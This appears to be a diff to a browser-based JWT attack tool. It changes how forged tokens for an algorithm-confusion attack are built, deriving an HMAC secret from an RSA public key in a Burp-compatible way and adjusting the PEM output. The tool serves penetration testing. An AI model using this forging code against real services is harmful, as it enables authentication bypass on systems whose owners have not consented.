@@ -112,14 +112,21 @@ async function generateJwkAttackToken(forceJwkSign) {
         if (rsaKey.kid) nextHeader.kid = rsaKey.kid;
 
         const pem = await jwkRsaPublicToPem(rsaKey);
+        // Burp-compatible flow:
+        // 1) public JWK -> PEM
+        // 2) Base64(PEM)
+        // 3) put into oct JWK.k (base64url)
+        // 4) HMAC uses decoded bytes from k
         const base64PemSecret = btoa(pem);
+        const symmetricJwkK = base64ToBase64url(base64PemSecret);
+        const hmacSecretBytes = base64ToBytes(symmetricJwkK);
         const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
-        nextSig = await hmacSignBase64url(signingInput, base64PemSecret, hashFromAlg(nextHeader.alg));
+        nextSig = await hmacSignBase64urlBytes(signingInput, hmacSecretBytes, hashFromAlg(nextHeader.alg));
         resultToken.value = `${signingInput}.${nextSig}`;
         attackNotes.textContent = [
           `Algorithm confusion candidate generated (${direction}).`,
           `Header alg switched to ${nextHeader.alg}.`,
-          'HMAC secret was built as Base64-encoded PEM extracted from RSA public key in provided JWKS.',
+          'HMAC key built via Burp-compatible path: PEM -> Base64 -> JWK.k -> decoded raw bytes.',
         ].join('\n');
         return;
       }
@@ -462,7 +469,7 @@ async function jwkRsaPublicToPem(rsaJwk) {
   const spki = await crypto.subtle.exportKey('spki', key);
   const b64 = btoa(String.fromCharCode(...new Uint8Array(spki)));
   const lines = b64.match(/.{1,64}/g)?.join('\n') || b64;
-  return `-----BEGIN PUBLIC KEY-----\n${lines}\n-----END PUBLIC KEY-----`;
+  return `-----BEGIN PUBLIC KEY-----\n${lines}\n-----END PUBLIC KEY-----\n`;
 }
 async function signWithMaterial(signingInput, alg, material) {
   if (alg.startsWith('HS')) return hmacSignBase64url(signingInput, material.secret, hashFromAlg(alg));
